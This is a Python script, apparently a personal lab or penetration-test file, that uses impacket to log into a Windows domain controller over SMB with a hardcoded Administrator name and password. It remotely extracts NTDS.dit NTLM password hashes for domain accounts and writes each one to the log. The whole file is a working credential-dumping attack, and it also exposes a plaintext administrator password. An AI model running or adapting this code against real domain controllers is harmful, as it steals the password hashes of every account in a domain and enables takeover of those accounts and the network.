# test_secretsdump.py
import logging
from impacket.dcerpc.v5 import transport
from impacket.examples.secretsdump import RemoteOperations, NTDSHashes

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def hash_callback(secret_type, secret):
    if secret_type == NTDSHashes.SECRET_TYPE.NTDS:
        logger.info(f"NTLM Hash: {secret}")

try:
    # Replace with your credentials and DC details
    dc_ip = "192.168.30.168"  # Your DC IP
    domain = "ZAYD"          # Your domain NetBIOS name
    username = "Administrator"  # Username without domain
    password = "Lsjqhv1234"   # Replace with correct password

    # Initialize SMB connection
    smb_connection = transport.SMBTransport(
        remoteName=dc_ip,      # Use dc_ip for remote_name
        remote_host=dc_ip,      # Correct parameter
        dstport=445,
        username=username,      # Username without domain
        password=password,
        domain=domain           # Explicit domain
    )
    smb_connection.connect()

    # Initialize RemoteOperations
    remote_ops = RemoteOperations(
        smbConnection=smb_connection.get_smb_connection(),
        doKerberos=False,
        kdcHost=None
    )

    # Initialize NTDSHashes
    ntds_dumper = NTDSHashes(
        ntdsFile=None,
        bootKey=None,
        isRemote=True,
        remoteOps=remote_ops,
        perSecretCallback=hash_callback,
        justNTLM=True,
        printUserStatus=True,
        pwdLastSet=True,
        history=False
    )

    # Perform the dump
    ntds_dumper.dump()

    # Cleanup
    ntds_dumper.finish()
    remote_ops.finish()
    smb_connection.disconnect()

    logger.info("NTDS.dit extraction completed successfully.")
except Exception as e:
    logger.error(f"Failed to extract NTDS.dit: {str(e)}")